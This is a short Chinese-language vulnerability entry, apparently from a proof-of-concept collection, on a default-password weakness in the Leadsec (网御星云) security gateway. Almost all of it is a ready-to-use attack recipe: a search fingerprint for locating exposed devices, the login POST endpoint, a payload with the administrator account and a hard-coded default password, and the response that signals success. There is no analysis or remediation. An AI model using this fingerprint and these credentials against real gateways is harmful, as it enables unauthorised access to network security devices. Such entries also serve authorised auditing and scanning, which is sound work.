# 网御星云安全网关cgi-bin存在弱口令漏洞

网御星云安全网关 ｜ 默认口令 ｜ —
- **指纹**：`title="网御安全网关"`
- **请求**：`POST /cgi-bin/webui?op=pcm_login HTTP/1.1`

**Payload**
```
txt_name=administrator&txt_password=leadsec@7766
```
- **响应特征**：200 administrator